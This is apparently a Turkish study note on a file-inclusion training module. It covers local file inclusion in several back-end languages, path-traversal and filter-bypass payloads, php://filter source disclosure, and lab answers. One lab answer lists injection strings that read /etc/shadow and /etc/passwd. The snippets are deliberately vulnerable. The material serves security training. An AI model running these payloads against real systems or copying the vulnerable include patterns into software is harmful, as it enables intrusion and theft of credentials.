---
{"dg-publish":true,"permalink":"/web-penters/file-includes/"}
---



# **File Inclusions**

`PHP`, `Javascript` veya `Java` gibi birçok modern back-end dili, web sayfasında neyin gösterileceğini belirtmek için HTTP parametrelerini kullanır, bu da dinamik web sayfaları oluşturmaya olanak tanır, betiğin genel boyutunu azaltır ve kodu basitleştirir. Bu gibi durumlarda, parametreler sayfada hangi kaynağın gösterileceğini belirtmek için kullanılır. Bu tür işlevler güvenli bir şekilde kodlanmazsa, bir saldırgan barındırma sunucusundaki herhangi bir local dosyanın içeriğini görüntülemek için bu parametreleri manipüle edebilir ve [Local File Inclusion (LFI)](“https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion”) güvenlik açığına yol açabilir.

## **Local File Inclusion (LFI)**  

LFI'yi genellikle içinde bulduğumuz en yaygın yer templating motorlarıdır. Sayfalar arasında gezinirken web uygulamasının çoğunun aynı görünmesini sağlamak için, bir templating engine `header`, `navigation bar` ve `footer` gibi ortak statik parçaları gösteren bir sayfa görüntüler ve ardından sayfalar arasında değişen diğer içeriği dinamik olarak yükler. Aksi takdirde, statik kısımlardan herhangi birinde değişiklik yapıldığında sunucudaki her sayfanın değiştirilmesi gerekir. Bu nedenle sık sık `/index.php?page=about` gibi bir parametre görürüz, burada `index.php` statik içeriği (örneğin üstbilgi/altbilgi) ayarlar ve ardından yalnızca parametrede belirtilen dinamik içeriği çeker, bu durumda `about.php` adlı bir dosyadan okunabilir. Talebin `about` kısmı üzerinde kontrol sahibi olduğumuz için, web uygulamasının diğer dosyaları alıp sayfada görüntülemesini sağlamak mümkün olabilir.



#### **PHP**  

`PHP`'de, bir sayfayı yüklerken yerel veya uzak bir dosyayı yüklemek için `include()` işlevini kullanabiliriz. Eğer `include()` fonksiyonuna aktarılan `yol` `GET` parametresi gibi kullanıcı tarafından kontrol edilen bir parametreden alınıyorsa ve `kod kullanıcı girdisini açıkça filtreleyip sterilize etmiyor`sa, kod Dosya Eklemeye karşı savunmasız hale gelir.

```php
if (isset($_GET['language'])) {
    include($_GET['language']);
}
```

`Language` parametresinin doğrudan `include()` fonksiyonuna aktarıldığını görüyoruz. Dolayısıyla, `language` parametresine aktardığımız herhangi bir yol, back-end sunucusundaki lokal dosyalar da dahil olmak üzere sayfaya yüklenecektir. Bu `include()` fonksiyonuna özel bir durum değildir, zira kendilerine aktarılan yol üzerinde kontrol sahibi olsaydık aynı güvenlik açığına yol açabilecek başka birçok PHP fonksiyonu vardır. Bu fonksiyonlar arasında `include_once()`, `require` `(` `)`, `require_once(` `)`, `file_get_contents()` ve diğerleri bulunmaktadır.


#### **NodeJS**  

PHP'de olduğu gibi, NodeJS web sunucuları da bir HTTP parametresine dayalı olarak içerik yükleyebilir. Aşağıda, bir sayfaya hangi verilerin yazılacağını kontrol etmek için bir GET parametre `language'nin` nasıl kullanıldığına dair temel bir örnek verilmiştir:

```javascript
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}
```

Gördüğümüz gibi, URL'den aktarılan parametre `readfile` fonksiyonu tarafından kullanılmakta ve dosya içeriği HTTP yanıtına yazılmaktadır. Bir başka örnek de `Express.js` framework'ündeki `render()` fonksiyonudur. Aşağıdaki örnek, `about.html` sayfasını hangi dizinden çekmesi gerektiğini belirlemek için `language` parametresini kullandığını göstermektedir:

```js
app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});
```

GET parametrelerinin URL'de bir (`?`) karakterinden sonra belirtildiği önceki örneklerimizden farklı olarak, yukarıdaki örnek parametreyi URL yolundan alır (örneğin `/about/en` veya `/about/es`). Parametre, `render()` fonksiyonu içinde `render` edilen dosyayı belirtmek için doğrudan kullanıldığından, bunun yerine farklı bir dosyayı göstermek için URL'yi değiştirebiliriz.


#### **Java**
Aşağıdaki örnekler, bir Java web sunucusu için web uygulamalarının `include` işlevini kullanarak belirtilen parametreye göre lccal dosyaları nasıl dahil edebileceğini göstermektedir:

```jsp
<c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language') %>" />
</c:if>
```

`include` fonksiyonu argüman olarak bir dosya veya sayfa URL'si alabilir ve daha önce NodeJS ile gördüğümüze benzer şekilde nesneyi front-end şablonuna işleyebilir. `Import` fonksiyonu, aşağıdaki örnekte olduğu gibi lokal bir dosyayı ya da URL'yi işlemek için de kullanılabilir:

```jsp
<c:import url= "<%= request.getParameter('language') %>"/>
```


#### **.NET**  

Son olarak, .NET web uygulamalarında File Inclusion güvenlik açıklarının nasıl oluşabileceğine bir örnek verelim. `Response.WriteFile` fonksiyonu, girdisi olarak bir dosya yolu aldığı ve içeriğini yanıta yazdığı için önceki örneklerimizin hepsine çok benzer şekilde çalışır. Yol, aşağıdaki gibi dinamik içerik yükleme için bir GET parametresinden alınabilir:

```cs
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
}
```

Ayrıca, `@Html.Partial()` fonksiyonu, daha önce gördüğümüze benzer şekilde, belirtilen dosyayı front-end template'in bir parçası olarak işlemek için de kullanılabilir:

```cs
@Html.Partial(HttpContext.Request.Query['language'])
```

Son olarak, `include` fonksiyonu lokal dosyaları veya uzak URL'leri işlemek için kullanılabilir ve ayrıca belirtilen dosyaları da çalıştırabilir:

```cs
<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
```

## Read vs Execute

Akılda tutulması gereken en önemli şey , `yukarıdaki fonksiyonlardan bazılarının sadece belirtilen dosyaların içeriğini okurken, diğerlerinin belirtilen dosyaları da çalıştırmasıdır`. Ayrıca, bazıları uzak URL'lerin belirtilmesine izin verirken, diğerleri yalnızca back-end sunucusunun yerel dosyalarıyla çalışır.


![Pasted image 20241117171629.png](/img/user/resimler/Pasted%20image%2020241117171629.png)
![Pasted image 20241117171639.png](/img/user/resimler/Pasted%20image%2020241117171639.png)

Dosyaların çalıştırılması fonksiyonları çalıştırmamıza ve sonunda kodun çalıştırılmasına yol açabileceğinden, sadece dosyanın içeriğini okumak kod çalıştırılmadan sadece kaynak kodu okumamıza izin vereceğinden, bu önemli bir farktır.


# Local File Inclusion (LFI)

Çoğu backend sunucusunda bulunan iki yaygın okunabilir dosya Linux `'` ta `/etc/passwd` ve Windows'ta `C:\Windows\boot.ini'` dir. Öyleyse, parametreyi `es'` den `/etc/passwd`'ye değiştirelim:

![Pasted image 20241117171954.png](/img/user/resimler/Pasted%20image%2020241117171954.png)


## **Path Traversal**

Önceki örnekte, bir dosyayı `mutlak yolunu` belirterek okuduk (örneğin `/etc/passwd`). Bu, aşağıdaki örnekte olduğu gibi, tüm girdi herhangi bir ekleme yapılmadan `include()` işlevi içinde kullanılırsa işe yarayacaktır:

```php
include($_GET['language']);
```

Bu durumda, `/etc/passwd` dosyasını okumaya çalışırsak `include()` işlevi bu dosyayı doğrudan getirir. Ancak, birçok durumda, web geliştiricileri `language` parametresine bir dize ekleyebilir veya önüne ekleyebilir. Örneğin, `language` parametresi dosya adı için kullanılabilir ve aşağıdaki gibi bir dizinden sonra eklenebilir:

```php
include("./languages/" . $_GET['language']);
```

Bu durumda,`/etc/passwd` dosyasını okumaya çalışırsak, `include() fonksiyonuna` aktarılan yol (`./languages//etc/passwd`) olacaktır ve bu dosya mevcut olmadığından, hiçbir şey okuyamayacağız`:`

![Pasted image 20241117172118.png](/img/user/resimler/Pasted%20image%2020241117172118.png)

`Relatif yolları` kullanarak dizinler arasında geçiş yaparak bu kısıtlamayı kolayca aşabiliriz . Bunu yapmak için, dosya adımızın önüne üst dizini ifade eden `../` ekleyebiliriz `.` Örneğin, diller dizininin tam yolu `/var/www/html/languages/` ise, `../index.php` kullanmak üst dizindeki `index.php` dosyasına (yani `/var/www/html/index` `.` `php`) atıfta bulunacaktır `.`  

Dolayısıyla, root yoluna (yani `/`) ulaşana kadar birkaç dizin geri gitmek için bu hileyi kullanabiliriz ve ardından mutlak dosya yolumuzu (örneğin `../../../../etc/passwd`) belirtiriz ve dosya mevcut olmalıdır:

![Pasted image 20241117172501.png](/img/user/resimler/Pasted%20image%2020241117172501.png)

Ayrıca, root yolunda (`/`) olsaydık ve `../` kullansaydık yine root yolunda kalırdık `.` Dolayısıyla, web uygulamasının hangi dizinde olduğundan emin değilsek, `../` 'yi birçok kez ekleyebiliriz ve bu yolu bozmayacaktır (bunu yüz kez yapsak bile!).

**İpucu:** Verimli olmak ve gereksiz yere birkaç kez `../` eklememek her zaman faydalı olabilir, özellikle de bir rapor yazıyorsak veya bir exploit yazıyorsak. Bu nedenle, her zaman işe yarayan minimum `../` sayısını bulmaya çalışın ve onu kullanın. Ayrıca root yoldan kaç dizin uzakta olduğunuzu hesaplayabilir ve o kadarını kullanabilirsiniz. Örneğin, `/var/www/html/` ile kök yoldan `3` dizin uzaktayız, bu nedenle . `.` /'i 3 kez kullanabiliriz (yani `../../../`).


## **Filename Prefix**  

Önceki örneğimizde, dizinden sonra `language` parametresini kullandık, böylece `passwd` dosyasını okumak için yolu geçebildik. Bazı durumlarda, girdimiz farklı bir dizeden sonra eklenebilir. Örneğin, aşağıdaki örnekte olduğu gibi tam dosya adını almak için bir önekle birlikte kullanılabilir:

```php
include("lang_" . $_GET['language']);
```

Bu durumda, dizini `../../../etc/passwd` ile geçmeye çalışırsak, son dize geçersiz olan `lang_../../../etc/passwd` olacaktır `:`

![Pasted image 20241117172656.png](/img/user/resimler/Pasted%20image%2020241117172656.png)

Beklendiği gibi, hata bize bu dosyanın mevcut olmadığını söyler. bu nedenle, doğrudan yol geçişini kullanmak yerine, payload'umuzun önüne bir `/` ekleyebiliriz ve bu öneki bir dizin olarak kabul etmeli ve ardından dosya adını atlamalı ve dizinleri geçebilmeliyiz:

![Pasted image 20241117173930.png](/img/user/resimler/Pasted%20image%2020241117173930.png)

**Not:** Bu her zaman işe yaramayabilir, çünkü bu örnekte `lang_/` adlı bir dizin mevcut olmayabilir, bu nedenle göreli yolumuz doğru olmayabilir. Ayrıca, `girdimize eklenen herhangi bir önek`, PHP wrapper'ları ve filtreleri veya RFI kullanımı gibi ileriki bölümlerde tartışacağımız `bazı dosya ekleme tekniklerini bozabilir`.

[[Bağlantılar/Wrapper Nedir\|Wrapper Nedir]] ? 


## **Appended Extensions**

Çok yaygın bir başka örnek de `language` parametresine aşağıdaki gibi bir uzantı eklenmesidir:

```php
include($_GET['language'] . ".php");
```

Bu oldukça yaygındır, çünkü bu durumda, dili her değiştirmemiz gerektiğinde uzantıyı yazmak zorunda kalmayız. Bu aynı zamanda bizi sadece PHP dosyalarını dahil etmekle kısıtlayabileceği için daha güvenli olabilir. Bu durumda, `/etc/passwd` dosyasını okumaya çalışırsak, dahil edilen dosya mevcut olmayan `/etc/passwd.php` olacaktır:

![Pasted image 20241117174441.png](/img/user/resimler/Pasted%20image%2020241117174441.png)

**Alıştırma yapın:** LFI aracılığıyla herhangi bir php dosyasını (örn. index.php) okumayı deneyin ve kaynak kodunu alıp alamayacağınızı veya dosyanın HTML olarak işlenip işlenmeyeceğini görün.


## **İkinci Dereceden Saldırılar**  

Gördüğümüz gibi, LFI saldırıları farklı şekillerde ortaya çıkabilmektedir. Bir diğer yaygın ve biraz daha gelişmiş LFI saldırısı ise `İkinci Dereceden Saldırıdır`. Bu, birçok web uygulaması işlevinin kullanıcı kontrollü parametrelere dayalı olarak back-end sunucusundan güvensiz bir şekilde dosya çekmesi nedeniyle meydana gelir.  

Örneğin, bir web uygulaması (`/profile/$username/avatar.png`) gibi bir URL aracılığıyla avatarımızı indirmemize izin verebilir. Kötü niyetli bir LFI kullanıcı adı oluşturursak (örn `. ../../../etc/passwd`), çekilen dosyayı sunucudaki başka bir yerel dosyaya değiştirmek ve avatarımız yerine onu almak mümkün olabilir.  

Bu durumda, kullanıcı adımızdaki kötü amaçlı bir LFI payloadı ile bir veritabanı girişini zehirlemiş oluruz. Ardından, başka bir web uygulaması işlevi, saldırımızı gerçekleştirmek için bu zehirli girişi kullanacaktır (yani, kullanıcı adı değerine göre avatarımızı indirecektir). Bu nedenle bu saldırıya `İkinci Dereceden` saldırı denir.

Geliştiriciler genellikle bu güvenlik açıklarını gözden kaçırırlar, çünkü doğrudan kullanıcı girdisine karşı koruma sağlayabilirler (örneğin bir `?page` parametresinden), ancak bu durumda kullanıcı adımız gibi veritabanlarından çekilen değerlere güvenebilirler. Kayıt sırasında kullanıcı adımızı zehirlemeyi başarsaydık, saldırı mümkün olurdu.


Soru : File inclusion'ı kullanarak sistemde "b" ile başlayan bir kullanıcının adını bulun.

Cevap : 

![Pasted image 20241117175146.png](/img/user/resimler/Pasted%20image%2020241117175146.png)


Soru : /usr/share/flags dizininde bulunan flag.txt dosyasının içeriğini gönderin.

Cevap :

![Pasted image 20241117175215.png](/img/user/resimler/Pasted%20image%2020241117175215.png)



# **Basic Bypasses**

## **Non-Recursive Path Traversal Filters**

LFI'ye karşı en temel filtrelerden biri, yol geçişlerini önlemek için (`../`) alt dizelerini sildiği bir arama ve değiştirme filtresidir`.` Örneğin:

```php
$language = str_replace('../', '', $_GET['language']);
```

Yukarıdaki kodun yol geçişini önlemesi ve dolayısıyla LFI'yi işe yaramaz hale getirmesi gerekiyor. Önceki bölümde denediğimiz LFI payloadlarını denersek, aşağıdakileri elde ederiz:


![Pasted image 20241117182822.png](/img/user/resimler/Pasted%20image%2020241117182822.png)


Tüm `../` alt dizelerinin kaldırıldığını ve bunun sonucunda `./languages/etc/passwd` şeklinde bir son yol elde edildiğini görüyoruz. Ancak, bu filtre çok güvensizdir, çünkü girdi dizesi üzerinde tek bir kez çalıştığı ve filtreyi çıktı dizesi üzerinde uygulamadığı için `../` alt dizesini `recursively` olarak `kaldırmaz` `.` Örneğin, payload olarak `....//` kullanırsak, filtre `../` 'i kaldırır ve çıktı dizesi . `.`/ olur, bu da hala yol geçişi yapabileceğimiz anlamına gelir. Bu mantığı `/etc/passwd` 'yi tekrar dahil etmek için uygulamayı deneyelim:

![Pasted image 20241117182956.png](/img/user/resimler/Pasted%20image%2020241117182956.png)

Gördüğümüz gibi, ekleme bu sefer başarılı oldu ve `/etc/passwd` dosyasını başarıyla okuyabiliyoruz. `....//` alt dizesi kullanabileceğimiz tek bypass değildir, çünkü `..././` veya `....\/` ve diğer birkaç recursive LFI payload kullanabiliriz `.` Ayrıca, bazı durumlarda, yol geçiş filtrelerinden kaçınmak için ileri eğik çizgi karakterinden kaçmak da işe yarayabilir (örneğin, `....\/`) veya fazladan ileri eğik çizgi eklemek (örneğin `, ....////`)



## Encoding

Bazı web filtreleri, yol geçişleri için kullanılan nokta `.` veya eğik çizgi `/` gibi LFI ile ilgili belirli karakterleri içeren girdi filtrelerini engelleyebilir `.` Bununla birlikte, bu filtrelerin bazıları, girdimizi URL kodlamasıyla atlatılabilir, böylece artık bu kötü karakterleri içermez, ancak yine de savunmasız fonksiyona ulaştığında yol geçiş dizemize geri çözülür. Özellikle 5.3.4 ve önceki sürümlerdeki çekirdek PHP filtreleri bu bypass'a karşı savunmasızdır, ancak daha yeni sürümlerde bile URL kodlaması yoluyla atlanabilecek özel filtreler bulabiliriz.  

Hedef web uygulaması girdimizde . ve `/` işaretlerine izin vermiyorsa, `../` ifadesini `%2e%2e%2f` olarak URL kodlayabiliriz, bu da filtreyi atlatabilir `.`

![Pasted image 20241117183346.png](/img/user/resimler/Pasted%20image%2020241117183346.png)

![Pasted image 20241117183455.png](/img/user/resimler/Pasted%20image%2020241117183455.png)

Gördüğümüz gibi, filtreyi başarıyla atlatabildik ve `/etc/passwd` dosyasını okumak için yol geçişini kullanabildik. Ayrıca, kodlanmış dizeyi bir kez daha kodlamak için Burp Decoder'ı kullanarak `çift kodlanmış` bir dizeye sahip olabiliriz, bu da diğer filtre türlerini de atlayabilir.


## **Onaylanmış Yollar**  

Bazı web uygulamaları, dahil edilen dosyanın belirli bir yol altında olduğundan emin olmak için Regular Expressions da kullanabilir. Örneğin, ele aldığımız web uygulaması aşağıdaki gibi yalnızca `./languages` dizini altındaki yolları kabul edebilir:

```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```

Onaylanan yolu bulmak için, mevcut formlar tarafından gönderilen istekleri inceleyebilir ve normal web işlevselliği için hangi yolu kullandıklarını görebiliriz. Ayrıca, aynı yol altındaki web dizinlerini fuzzlayabilir ve bir eşleşme elde edene kadar farklı olanları deneyebiliriz. Bunu atlamak için, path traversal kullanabilir ve payload'umuzu onaylanan yolla başlatabilir ve ardından root dizinine geri dönmek ve belirttiğimiz dosyayı okumak için `../` kullanabiliriz, aşağıdaki gibi:

![Pasted image 20241117212252.png](/img/user/resimler/Pasted%20image%2020241117212252.png)

Bazı web uygulamaları bu filtreyi daha önceki filtrelerden biriyle birlikte uygulayabilir, bu nedenle payload'umuzu onaylanan yolla başlatarak ve ardından payload'umuzu URL kodlayarak veya recursive payload kullanarak her iki tekniği birleştirebiliriz.  

**Not:** Şimdiye kadar bahsedilen tüm teknikler, back-end geliştirme dili veya framework'ten bağımsız olarak herhangi bir LFI güvenlik açığı ile çalışmalıdır.

## **Appended Extension**

Önceki bölümde tartışıldığı gibi, bazı web uygulamaları, eklediğimiz dosyanın beklenen uzantıda olduğundan emin olmak için girdi dizemize bir uzantı ekler (örneğin `.php`). PHP'nin modern sürümlerinde, bunu atlayamayabiliriz ve yalnızca bu uzantıdaki dosyaları okumakla sınırlı kalırız, ancak bir sonraki bölümde göreceğimiz gibi (örneğin kaynak kodu okumak için) yine de yararlı olabilir.  

Kullanabileceğimiz birkaç başka teknik daha vardır, ancak bunlar `PHP'nin modern sürümlerinde` kullanılmazlar `ve yalnızca 5.3/5.4 öncesi PHP sürümlerinde çalışırlar`.


#### **Path Truncation**  

PHP'nin önceki sürümlerinde tanımlı stringlerin azami uzunluğu 4096 karakterdir, bunun sebebi muhtemelen 32 bitlik sistemlerdeki sınırlamalardır. Daha uzun bir string geçilirse, basitçe `kesilir` ve maksimum uzunluktan sonraki tüm karakterler yoksayılır. Ayrıca, PHP path isimlerinde sondaki eğik çizgileri ve tek noktaları da kaldırırdı, bu nedenle (`/etc/passwd/`. ) çağırırsak `/.` de kesilir ve PHP (`/etc/passwd`) çağırırdı `.` PHP ve genel olarak Linux sistemleri yoldaki birden fazla bölü çizgisini de dikkate almaz (örneğin, `////etc/passwd` `/etc/passwd` ile aynıdır). Benzer şekilde, path'in ortasındaki bir geçerli dizin kısayolu (`.`) da dikkate alınmaz (örn. `/etc/./passwd`)`.`

Bu iki PHP sınırlamasını bir araya getirirsek, doğru bir yol olarak değerlendirilen çok uzun dizeler oluşturabiliriz. 4096 karakter sınırlamasına ulaştığımızda, eklenen uzantı (`.php`) kesilecek ve eklenmiş uzantısı olmayan bir yolumuz olacaktır. Son olarak, bu tekniğin çalışması için `yolu mevcut olmayan bir dizinle başlatmamız` gerektiğini de belirtmek önemlidir.  

Bu tür bir payload örneği aşağıdaki gibi olabilir:

```url
?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
```

Elbette `./` dizesini 2048 kez (toplam 4096 karakter) elle yazmak zorunda değiliz, ancak aşağıdaki komutla bu dizenin oluşturulmasını otomatikleştirebiliriz:

```shell-session
[!bash!]$ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
non_existing_directory/../../../etc/passwd/./././<SNIP>././././
```

Önceki bölümde açıklandığı gibi, daha fazlasını eklemek bizi yine root dizinine götüreceğinden, `../` sayısını da artırabiliriz `.` Ancak, bu yöntemi kullanırsak, dizenin sonunda (`/etc/passwd`) istenen dosyamızın değil, yalnızca `.php` 'nin kesildiğinden emin olmak için dizenin tam uzunluğunu hesaplamalıyız. Bu yüzden ilk yöntemi kullanmak daha kolay olacaktır.


#### **Null Bytes**  

PHP'nin 5.5'ten önceki sürümleri `null byte enjeksiyonuna` karşı savunmasızdı, yani stringin sonuna bir null byte (`%00`) eklemek stringi sonlandıracak ve ondan sonraki hiçbir şeyi dikkate almayacaktı. Bunun nedeni, stringlerin düşük seviyeli bellekte nasıl saklandığıdır; bellekteki stringler, Assembly, C veya C++ dillerinde görüldüğü gibi, stringin sonunu belirtmek için bir null byte kullanmalıdır.  

Bu güvenlik açığından yararlanmak için, payload'umuzu bir null byte ile sonlandırabiliriz (örneğin `/etc/passwd%00`), böylece `include() işlevine` aktarılan son yol (`/etc/passwd%00.php`) olacaktır. Bu şekilde, `.php` dizemize eklenmiş olsa bile, null bayttan sonraki her şey kesilecek ve böylece kullanılan yol aslında `/etc/passwd` olacaktır, bu da eklenmiş uzantıyı atlamamıza yol açacaktır.


Soru : Yukarıdaki web uygulaması LFI istismarını önlemek için birden fazla filtre kullanmaktadır. flag.txt dosyasını okumak için bu filtreleri atlamaya çalışın

Cevap :

Çalışan Payloadlar Herhangi birini kullanabilirsiniz.

%0a/bin/cat%20/etc/shadow   
%0a/bin/cat%20/etc/passwd   
%0a/bin/cat%20/etc/shadow   
%0a/bin/cat%20/etc/passwd   
/…/./…/./…/./…/./…/./…/./…/./…/./etc/passwd   
%0a/bin/cat%20/etc/passwd   
%0a/bin/cat%20/etc/shadow   
%0a/bin/cat%20/etc/shadow   
%0a/bin/cat%20/etc/passwd   
%0a/bin/cat%20/etc/passwd   
%0a/bin/cat%20/etc/shadow   
/…/./…/./…/./…/./…/./…/./…/./…/./etc/passwd

![Pasted image 20241117214158.png](/img/user/resimler/Pasted%20image%2020241117214158.png)


# PHP Filters

Birçok popüler web uygulaması, Laravel veya Symfony gibi farklı PHP framework'leriyle oluşturulmuş çeşitli özel web uygulamalarıyla birlikte PHP'de geliştirilmiştir. PHP web uygulamalarında bir LFI güvenlik açığı tespit edersek, LFI istismarımızı genişletmek ve hatta potansiyel olarak uzaktan kod yürütmeye ulaşmak için farklı [PHP Wrappers](https://www.php.net/manual/en/wrappers.php.php) kullanabiliriz.

PHP Wrappers, uygulama düzeyinde standart input/output, dosya tanımlayıcıları ve bellek akışları gibi farklı I/O akışlarına erişmemizi sağlar. Bunun PHP geliştiricileri için pek çok kullanımı vardır. Yine de, web sızma testçileri olarak, sömürü saldırılarımızı genişletmek ve PHP kaynak kodu dosyalarını okuyabilmek ve hatta sistem komutlarını çalıştırabilmek için bu wrappers'ı kullanabiliriz.

Bu bölümde, PHP kaynak kodunu okumak için temel PHP filtrelerinin nasıl kullanıldığını göreceğiz ve bir sonraki bölümde, farklı PHP wrappers'ın LFI güvenlik açıkları aracılığıyla remote code execution elde etmemize nasıl yardımcı olabileceğini göreceğiz.


## **Input Filters**  

[PHP Filters](https://www.php.net/manual/en/filters.php), farklı girdi türlerini aktarabildiğimiz ve belirttiğimiz filtre tarafından filtrelenmesini sağlayabildiğimiz bir tür PHP wrapper'dır. PHP wrapper akışlarını kullanmak için stringimizde `php://` şemasını kullanabilir ve PHP filtre wrapper'ına `php://filter/` ile erişebiliriz.  

`Filter` wrapper'ının birkaç parametresi vardır, ancak saldırımız için ihtiyaç duyduğumuz ana parametreler `resource` ve `read'dir`. `resource` parametresi filtre wrapper'ları için gereklidir ve bununla filtreyi uygulamak istediğimiz akışı belirtebiliriz (örneğin lokal bir dosya), `read` parametresi ise girdi kaynağına farklı filtreler uygulayabilir, bu yüzden kaynağımıza hangi filtreyi uygulamak istediğimizi belirtmek için kullanabiliriz.

Kullanılabilecek dört farklı filtre türü vardır: [Dize Filtreleri](https://www.php.net/manual/en/filters.string.php), [Dönüştürme Filtreleri](https://www.php.net/manual/en/filters.convert.php), [Sıkıştırma](https://www.php.net/manual/en/filters.compression.php) [Filtreleri](https://www.php.net/manual/en/filters.convert.php) ve [Şifreleme Filtreleri](https://www.php.net/manual/en/filters.encryption.php). Her filtre hakkında daha fazla bilgiyi ilgili bağlantılardan edinebilirsiniz, ancak LFI saldırıları için yararlı olan filtre, `Conversion Filters` altındaki `convert.base64-encode` `filtresidir`.

## **PHP Dosyaları için Fuzzing**

```shell-session
M1R4CKCK@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php

...SNIP...

index                   [Status: 200, Size: 2652, Words: 690, Lines: 64]
config                  [Status: 302, Size: 0, Words: 1, Lines: 1]
```

**İpucu:** Normal web uygulaması kullanımından farklı olarak, local dosya ekleme erişimimiz olduğu için HTTP yanıt kodu 200 olan sayfalarla sınırlı değiliz, bu nedenle `301`, `302` ve `403` sayfaları da dahil olmak üzere tüm kodları taramalıyız ve kaynak kodlarını da okuyabilmeliyiz.

Tanımlanan herhangi bir dosyanın kaynağını okuduktan sonra bile, web uygulamasının kaynağının çoğunu yakalayana veya ne yaptığına dair doğru bir görüntü elde edene kadar, `referans verilen diğer PHP` dosyaları için onları tarayabilir ve ardından bunları da okuyabiliriz. `Index.php` dosyasını okuyarak ve daha fazla referans için tarayarak başlamak da mümkündür, ancak PHP dosyaları için fuzzing yapmak, aksi takdirde bu şekilde bulunamayacak bazı dosyaları ortaya çıkarabilir.


## **Standard PHP Inclusion**  

Önceki bölümlerde, LFI aracılığıyla herhangi bir php dosyasını include etmeye çalıştıysanız, include edilen PHP dosyasının çalıştırıldığını ve sonunda normal bir HTML sayfası olarak render edildiğini fark etmişsinizdir. Örneğin, `config.php` sayfasını (`.` php uzantısı web uygulaması tarafından eklenmiştir) dahil etmeye çalışalım:

![Pasted image 20241117215511.png](/img/user/resimler/Pasted%20image%2020241117215511.png)

Gördüğümüz gibi, `config.php` büyük olasılıkla yalnızca web uygulaması yapılandırmasını ayarladığından ve herhangi bir HTML çıktısı oluşturmadığından, LFI dizemizin yerine boş bir sonuç alıyoruz.

Gördüğümüz gibi, `config.php` büyük olasılıkla yalnızca web uygulaması yapılandırmasını ayarladığından ve herhangi bir HTML çıktısı oluşturmadığından, LFI dizemizin yerine boş bir sonuç alıyoruz.  

Bu, erişimimiz olmayan lokal PHP sayfalarına erişmek gibi bazı durumlarda faydalı olabilir (örn. SSRF), ancak çoğu durumda, PHP kaynak kodunu LFI aracılığıyla okumakla daha çok ilgileniriz, çünkü kaynak kodları web uygulaması hakkında önemli bilgileri ortaya çıkarma eğilimindedir. İşte bu noktada `base64` php filtresi kullanışlı hale gelir, çünkü bu filtreyi php dosyasını base64 kodlamak için kullanabiliriz ve ardından çalıştırmak ve işlemek yerine kodlanmış kaynak kodunu elde ederiz. Bu, özellikle PHP uzantılı LFI ile uğraştığımız durumlarda kullanışlıdır, çünkü önceki bölümde tartışıldığı gibi yalnızca PHP dosyalarını dahil etmekle kısıtlanmış olabiliriz.  

**Not:** Aynı durum, savunmasız işlev dosyaları çalıştırabildiği sürece PHP dışındaki web uygulama dilleri için de geçerlidir. Aksi takdirde, doğrudan kaynak kodunu alırız ve kaynak kodunu okumak için ekstra filtreler/fonksiyonlar kullanmamız gerekmez. Hangi işlevlerin hangi ayrıcalıklara sahip olduğunu görmek için bölüm 1'deki fonksiyonlar tablosuna bakın.

## **Kaynak Kodunun Açıklanması**  

Okumak istediğimiz potansiyel PHP dosyalarının bir listesini elde ettikten sonra, `base64` PHP filtresiyle kaynaklarını ifşa etmeye başlayabiliriz. `config.php` dosyasının kaynak kodunu base64 filtresini kullanarak, `okuma` parametresi için `convert.base64-encode` ve `kaynak` parametresi için `config` belirterek aşağıdaki gibi okumayı deneyelim:


```url
php://filter/read=convert.base64-encode/resource=config
```

![Pasted image 20241117215848.png](/img/user/resimler/Pasted%20image%2020241117215848.png)

**Not:** `.php` uzantısı otomatik olarak girdi stringimizin sonuna eklendiğinden, kaynak dosyasını kasıtlı olarak stringimizin sonunda bıraktık, bu da belirttiğimiz kaynağın `config.php` olmasını sağlayacaktı.  

Gördüğümüz gibi, normal LFI ile yaptığımız denemenin aksine, base64 filtresini kullanmak daha önce gördüğümüz boş sonuç yerine kodlanmış bir string döndürdü. Şimdi `config.php`'nin kaynak kodunun içeriğini elde etmek için bu string'in kodunu aşağıdaki gibi çözebiliriz:

```shell-session
M1R4CKCK@htb[/htb]$ echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d

...SNIP...

if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
  header('HTTP/1.0 403 Forbidden', TRUE, 403);
  die(header('location: /index.php'));
}

...SNIP...
```

**İpucu:** base64 kodlu stringi kopyalarken, tüm stringi kopyaladığınızdan emin olun, aksi takdirde tam olarak deşifre olmaz. Stringin tamamını kopyaladığınızdan emin olmak için sayfa kaynağını görüntüleyebilirsiniz.


Soru : Web uygulamasını diğer php betikleri için fuzzlayın ve ardından yapılandırma dosyalarından birini okuyun ve veritabanı şifresini cevap olarak gönderin

cevap :

1- Hedef sistemde bir fuzz çalıştırıp işe yarayabilecek bir dizin keşfedelim

![Pasted image 20241117220151.png](/img/user/resimler/Pasted%20image%2020241117220151.png)

2- php://filter/read=convert.base64-encode/resource=configure → Payloadını LFI açığı olan adrese yerleştirelim.

![Pasted image 20241117220206.png](/img/user/resimler/Pasted%20image%2020241117220206.png)

3- Bize sonucu base64 formatında veriyor hata yapmamak için kodu kaynka koddan kopyalayalım ve terminalimizde çözelim .

![Pasted image 20241117220218.png](/img/user/resimler/Pasted%20image%2020241117220218.png)


# PHP Wrappers

